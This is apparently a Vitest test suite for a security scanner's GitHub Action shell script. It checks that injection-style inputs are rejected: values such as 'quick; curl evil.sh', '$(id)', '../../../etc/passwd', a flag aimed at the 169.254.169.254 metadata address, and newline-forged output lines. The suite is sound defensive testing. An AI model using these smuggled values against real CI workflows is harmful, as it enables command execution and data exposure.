import { spawnSync } from "node:child_process";
import { chmod, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { platform } from "node:process";

import { afterAll, describe, expect, it } from "vitest";

/**
 * The composite Action, executed rather than read.
 *
 * `action/action.yml` is the only shipped surface that is a shell script, and
 * it is the one people run in CI against trees they did not write. Nothing
 * else in this repository tests it: it is not imported by any module, `pnpm
 * test` never touches it, and its failure mode is a green job that scanned the
 * wrong thing. Reviewing YAML by eye is how the `--` bug below survived.
 *
 * So these tests pull the script body out of the YAML, run it with a `npx`
 * shim on PATH, and assert on the argv the shim was handed. Each hostile case
 * is a value a workflow could plausibly interpolate — a `workflow_dispatch`
 * input, a matrix entry read out of the repository, a value from an untrusted
 * PR — and the question each asks is what the value turns into by the time it
 * reaches the CLI.
 */

const ROOT = new URL("../../../", import.meta.url);

/**
 * Extracts the `run:` block scalar from the Action's single script step.
 *
 * Not a YAML parser, and specifically not tolerant: it asserts the block is
 * indented the way it expects and throws otherwise. A loose extractor that
 * silently matched half the script would make every test below pass while
 * testing a fragment.
 */
async function scriptBody(): Promise<string> {
  const yaml = await readFile(new URL("action/action.yml", ROOT), "utf8");
  const start = yaml.indexOf("\n      run: |\n");
  if (start === -1) throw new Error("action.yml has no `run: |` step at the expected indent");

  const lines = yaml.slice(start + "\n      run: |\n".length).split("\n");
  const body: string[] = [];
  for (const line of lines) {
    if (line.trim() !== "" && !line.startsWith("        ")) break;
    body.push(line.slice(8));
  }
  if (body.length < 40) throw new Error(`extracted only ${body.length} lines; the block moved`);
  return body.join("\n");
}

const workspaces: string[] = [];

afterAll(async () => {
  await Promise.all(workspaces.map((dir) => rm(dir, { recursive: true, force: true })));
});

interface Result {
  code: number;
  stderr: string;
  /** The argv `npx` was invoked with, or null if it was never reached. */
  argv: string[] | null;
  /** Everything written to `$GITHUB_OUTPUT`. */
  output: string;
}

/**
 * Runs the Action's script with the given inputs.
 *
 * `npxExit` is the exit code the stubbed CLI reports, which is how the
 * pass-through assertions distinguish "the Action failed" from "the scan found
 * something".
 */
async function runAction(
  inputs: Record<string, string>,
  options: { npxExit?: number } = {},
): Promise<Result> {
  const workspace = await mkdtemp(join(tmpdir(), "owlwarden-action-"));
  workspaces.push(workspace);

  const bin = join(workspace, "bin");
  const argvLog = join(workspace, "argv.txt");
  const githubOutput = join(workspace, "github-output.txt");
  await mkdir(bin, { recursive: true });
  await writeFile(githubOutput, "");

  // The shim records argv one NUL-delimited entry per call, so a value that
  // itself contains a newline cannot forge an extra argument in the log.
  await writeFile(
    join(bin, "npx"),
    `#!/usr/bin/env bash\nprintf '%s\\0' "$@" >> ${JSON.stringify(argvLog)}\nexit ${options.npxExit ?? 0}\n`,
  );
  await chmod(join(bin, "npx"), 0o755);

  await writeFile(join(workspace, "script.sh"), await scriptBody());

  const defaults: Record<string, string> = {
    INPUT_PATH: ".",
    INPUT_VERSION: "1.1.0",
    INPUT_PRESET: "quick",
    INPUT_SINCE: "",
    INPUT_FAIL_ON: "medium",
    INPUT_MIN_CONFIDENCE: "likely",
    INPUT_FORMAT: "sarif",
    INPUT_OUT: "owlwarden-results.sarif",
    INPUT_BASELINE: "",
    INPUT_ALLOW_BASELINE: "false",
    INPUT_ALLOW_SUPPRESSIONS: "false",
    INPUT_ALLOW_PROJECT_CONFIG: "false",
    INPUT_OSV: "false",
    INPUT_FAIL_ON_EXPOSURE: "",
    INPUT_SEAL: "off",
    INPUT_REQUIRE_SIGNED_SEAL: "false",
  };

  const result = spawnSync("bash", [join(workspace, "script.sh")], {
    cwd: workspace,
    encoding: "utf8",
    env: {
      ...defaults,
      ...inputs,
      PATH: `${bin}:${process.env.PATH ?? ""}`,
      GITHUB_OUTPUT: githubOutput,
      GITHUB_WORKSPACE: workspace,
    },
  });

  const raw = await readFile(argvLog, "utf8").catch(() => null);
  return {
    code: result.status ?? -1,
    stderr: result.stderr,
    argv: raw === null ? null : raw.split("\0").slice(0, -1),
    output: await readFile(githubOutput, "utf8"),
  };
}

// bash is not a thing to assume on a Windows runner, and the Action declares
// `shell: bash` precisely because GitHub provides it there. Skipping keeps the
// matrix honest rather than pretending this ran.
const onPosix = platform === "win32" ? describe.skip : describe;

onPosix("the Action's script", () => {
  describe("a value that begins with a dash is not an argument", () => {
    // The bug these were written for: `path` was interpolated as a bare
    // positional, and the CLI's parser resolves a flag-shaped positional as a
    // flag. `--allow-plugins` as the path scanned the whole repository with
    // plugin loading enabled and the operator saw a green step.
    it.each([
      ["--target=http://169.254.169.254", "egress to the instance metadata service"],
      ["--plugin=./evil.wasm", "loading code out of the tree under scan"],
      ["--allow-plugins", "a mute switch the workflow author never wrote"],
      ["-h", "a short flag, which the long-flag checks would miss"],
    ])("refuses path=%s (%s)", async (value) => {
      const result = await runAction({ INPUT_PATH: value });
      expect(result.code).toBe(2);
      expect(result.stderr).toMatch(/must not begin with '-'/);
      // Refusing after invoking the CLI would be no defence at all.
      expect(result.argv).toBeNull();
    });

    it("refuses a flag-shaped out, which would be eaten as --out's value", async () => {
      const result = await runAction({ INPUT_OUT: "--osv" });
      expect(result.code).toBe(2);
      expect(result.argv).toBeNull();
    });

    it("refuses a flag-shaped baseline", async () => {
      const result = await runAction({
        INPUT_ALLOW_BASELINE: "true",
        INPUT_BASELINE: "--allow-active",
      });
      expect(result.code).toBe(2);
      expect(result.argv).toBeNull();
    });
  });

  it("puts the path after `--`, so a legitimate odd name is still a path", async () => {
    const result = await runAction({ INPUT_PATH: "apps/web" });
    expect(result.code).toBe(0);
    expect(result.argv).not.toBeNull();

    const argv = result.argv ?? [];
    expect(argv.at(-2)).toBe("--");
    expect(argv.at(-1)).toBe("apps/web");
    // And the separator comes after every flag, not in the middle of them.
    expect(argv.indexOf("--")).toBe(argv.length - 2);
  });

  it("keeps the path a positional even when conditional flags are added", async () => {
    const result = await runAction({
      INPUT_PATH: "apps/web",
      INPUT_OSV: "true",
      INPUT_ALLOW_SUPPRESSIONS: "true",
      INPUT_ALLOW_PROJECT_CONFIG: "true",
    });
    const argv = result.argv ?? [];
    expect(argv).toContain("--osv");
    expect(argv).toContain("--allow-suppressions");
    expect(argv.at(-2)).toBe("--");
    expect(argv.at(-1)).toBe("apps/web");
  });

  describe("enumerated inputs are allowlists, not suggestions", () => {
    it.each([
      ["INPUT_PRESET", "deep", true],
      ["INPUT_PRESET", "agent-surface", true],
      ["INPUT_PRESET", "quick; curl evil.sh", false],
      ["INPUT_PRESET", "", false],
      ["INPUT_FAIL_ON", "critical", false],
      ["INPUT_MIN_CONFIDENCE", "maybe", false],
      ["INPUT_FORMAT", "agent", false],
      ["INPUT_FORMAT", "html", false],
    ])("%s=%s accepted: %s", async (name, value, accepted) => {
      const result = await runAction({ [name]: value });
      expect(result.code).toBe(accepted ? 0 : 2);
    });

    it("passes the preset through rather than dropping it", async () => {
      const result = await runAction({ INPUT_PRESET: "agent-surface" });
      const argv = result.argv ?? [];
      expect(argv[argv.indexOf("--preset") + 1]).toBe("agent-surface");
    });
  });

  describe("nothing may forge a line in GITHUB_OUTPUT", () => {
    it.each(["INPUT_PATH", "INPUT_OUT", "INPUT_VERSION", "INPUT_FORMAT", "INPUT_BASELINE"])(
      "refuses a newline in %s",
      async (name) => {
        const result = await runAction({ [name]: "value\nexit-code=0" });
        expect(result.code).toBe(2);
        expect(result.stderr).toMatch(/must not contain CR\/LF/);
        expect(result.output).toBe("");
      },
    );

    it("refuses a carriage return, which splits lines on a Windows runner too", async () => {
      const result = await runAction({ INPUT_OUT: "a\rb" });
      expect(result.code).toBe(2);
    });

    it("writes report-path with a heredoc rather than key=value", async () => {
      const result = await runAction({ INPUT_OUT: "reports/scan.sarif" });
      expect(result.output).toMatch(/report-path<<OWLWARDEN_EOF\n.*reports\/scan\.sarif\nOWLWARDEN_EOF\n/);
      expect(result.output).toMatch(/exit-code=0\n/);
    });
  });

  describe("the version becomes part of an npx spec", () => {
    it.each([
      ["1.1.0", true],
      ["1.2.0-rc.1", true],
      ["latest", true],
      ["1.1.0 && curl evil.sh", false],
      ["$(id)", false],
      ["../../../etc/passwd", false],
      ["", false],
      ["-1.0.0", false],
    ])("version=%s accepted: %s", async (value, accepted) => {
      const result = await runAction({ INPUT_VERSION: value });
      expect(result.code).toBe(accepted ? 0 : 2);
      if (accepted) {
        expect(result.argv?.[1]).toBe(`owlwarden@${value}`);
      }
    });
  });

  describe("paths stay inside the workspace", () => {
    it.each([
      ["INPUT_OUT", "/etc/owlwarden.sarif"],
      ["INPUT_OUT", "reports/../../escape.sarif"],
      ["INPUT_PATH", "../other-repo"],
    ])("refuses %s=%s", async (name, value) => {
      const result = await runAction({ [name]: value });
      expect(result.code).toBe(2);
      expect(result.argv).toBeNull();
    });

    it("refuses an escaping baseline even when baselines are allowed", async () => {
      const result = await runAction({
        INPUT_ALLOW_BASELINE: "true",
        INPUT_BASELINE: "../../etc/baseline.json",
      });
      expect(result.code).toBe(2);
    });
  });

  describe("the mute switches are opt-in", () => {
    it("ignores a baseline when allow-baseline is not true", async () => {
      const result = await runAction({ INPUT_BASELINE: "baseline.json" });
      expect(result.code).toBe(0);
      expect(result.argv).not.toContain("--baseline");
      expect(result.argv).not.toContain("--allow-baseline");
    });

    it("passes both flags together, never the baseline alone", async () => {
      const result = await runAction({
        INPUT_ALLOW_BASELINE: "true",
        INPUT_BASELINE: "baseline.json",
      });
      const argv = result.argv ?? [];
      expect(argv).toContain("--allow-baseline");
      expect(argv[argv.indexOf("--baseline") + 1]).toBe("baseline.json");
    });

    it.each(["yes", "TRUE", "1", "", "false"])(
      "treats allow-suppressions=%s as anything but true",
      async (value) => {
        const result = await runAction({ INPUT_ALLOW_SUPPRESSIONS: value });
        expect(result.argv).not.toContain("--allow-suppressions");
      },
    );

    it("always passes --ci, which is what makes those switches mean anything", async () => {
      const result = await runAction({});
      expect(result.argv).toContain("--ci");
    });
  });

  describe("the exit code is the CLI's, not the script's", () => {
    it.each([0, 1, 2])("passes through %i", async (code) => {
      const result = await runAction({}, { npxExit: code });
      expect(result.code).toBe(code);
      expect(result.output).toMatch(new RegExp(`exit-code=${code}\n`));
    });

    it("still records the output when findings were reported", async () => {
      const result = await runAction({}, { npxExit: 1 });
      // `set -e` must not skip the GITHUB_OUTPUT write on a findings exit —
      // a job that fails without a report path is a job nobody can triage.
      expect(result.output).toMatch(/report-path<</);
    });
  });

  describe("--since narrows the scan and nothing else", () => {
    it("is absent when the input is empty, rather than passed as an empty ref", async () => {
      const result = await runAction({ INPUT_SINCE: "" });
      expect(result.code).toBe(0);
      expect(result.argv).not.toContain("--since");
    });

    it.each(["HEAD~1", "main", "origin/main", "abc123def", "release/1.1", "HEAD^"])(
      "passes %s through",
      async (ref) => {
        const result = await runAction({ INPUT_SINCE: ref });
        expect(result.code).toBe(0);
        expect(result.argv?.[(result.argv?.indexOf("--since") ?? -1) + 1]).toBe(ref);
      },
    );

    it.each([
      ["main..HEAD", "a revision range silently widens the scope"],
      ["main...HEAD", "the symmetric-difference form does too"],
      ["--staged", "a second scope flag, which the CLI refuses but should never see"],
      ["main; curl evil.sh", "shell metacharacters"],
      ["$(id)", "command substitution"],
      ["main HEAD", "two refs in one value"],
    ])("refuses since=%s (%s)", async (ref) => {
      const result = await runAction({ INPUT_SINCE: ref });
      expect(result.code).toBe(2);
      expect(result.argv).toBeNull();
    });

    it("still puts the path last, after the scope flag", async () => {
      const result = await runAction({ INPUT_SINCE: "HEAD~1", INPUT_PATH: "apps/web" });
      const argv = result.argv ?? [];
      expect(argv.indexOf("--since")).toBeLessThan(argv.indexOf("--"));
      expect(argv.at(-1)).toBe("apps/web");
    });
  });

  describe("the seal step", () => {
    // The seal answers a different question from the scan — "is this the
    // configuration you agreed to" rather than "is it dangerous" — so it runs
    // after the scan rather than instead of it, and it is off unless asked for.
    it("is not run at all when seal is off", async () => {
      const result = await runAction({ INPUT_SEAL: "off" });
      expect(result.code).toBe(0);
      const argv = result.argv ?? [];
      expect(argv).not.toContain("seal");
    });

    it("verifies the surface after the scan when asked", async () => {
      const result = await runAction({ INPUT_SEAL: "verify" });
      const argv = result.argv ?? [];
      expect(argv).toContain("seal");
      expect(argv).toContain("--verify");
      // The scan comes first: a job that verified the seal and skipped the scan
      // would report the other question as clean.
      expect(argv.indexOf("scan")).toBeLessThan(argv.indexOf("seal"));
    });

    it("passes --require-signed-seal through only when asked", async () => {
      const off = await runAction({ INPUT_SEAL: "verify" });
      expect(off.argv ?? []).not.toContain("--require-signed-seal");
      const on = await runAction({
        INPUT_SEAL: "verify",
        INPUT_REQUIRE_SIGNED_SEAL: "true",
      });
      expect(on.argv ?? []).toContain("--require-signed-seal");
    });

    it("puts the path last, after the -- separator, in the seal call too", async () => {
      const result = await runAction({ INPUT_SEAL: "verify", INPUT_PATH: "apps/api" });
      const argv = result.argv ?? [];
      const lastSeparator = argv.lastIndexOf("--");
      expect(argv[lastSeparator + 1]).toBe("apps/api");
    });

    it("refuses a seal mode it does not know", async () => {
      const result = await runAction({ INPUT_SEAL: "sometimes" });
      expect(result.code).toBe(2);
      expect(result.stderr).toContain("seal must be");
      expect(result.argv).toBeNull();
    });

    it("treats an unset seal input as off, for a caller pinned to an older version", async () => {
      // `set -u` is on. A workflow using an older `uses:` ref supplies none of
      // these variables, and dying on an unbound one would break every such
      // caller the moment this input shipped.
      const result = await runAction({ INPUT_SEAL: "" });
      expect(result.code).toBe(0);
      expect(result.argv ?? []).not.toContain("seal");
    });

    it("stays silent in seal-diff when the surface has not moved", async () => {
      const result = await runAction({ INPUT_SEAL: "verify" });
      expect(result.output).toMatch(/seal-diff<<OWLWARDEN_EOF\n\nOWLWARDEN_EOF/);
    });
  });

  describe("--fail-on-exposure", () => {
    it("is omitted when the input is empty, rather than passed as an empty value", async () => {
      const result = await runAction({ INPUT_FAIL_ON_EXPOSURE: "" });
      expect(result.argv ?? []).not.toContain("--fail-on-exposure");
    });

    it("passes a known reachability through", async () => {
      const result = await runAction({ INPUT_FAIL_ON_EXPOSURE: "internet" });
      const argv = result.argv ?? [];
      expect(argv[argv.indexOf("--fail-on-exposure") + 1]).toBe("internet");
    });

    it("refuses a value it does not know", async () => {
      const result = await runAction({ INPUT_FAIL_ON_EXPOSURE: "sometimes" });
      expect(result.code).toBe(2);
      expect(result.stderr).toContain("fail-on-exposure must be");
      expect(result.argv).toBeNull();
    });
  });

  it("creates the report's directory before the CLI needs it", async () => {
    const result = await runAction({ INPUT_OUT: "nested/deeper/out.sarif" });
    expect(result.code).toBe(0);
    const argv = result.argv ?? [];
    expect(argv[argv.indexOf("--out") + 1]).toBe("nested/deeper/out.sarif");
  });
});
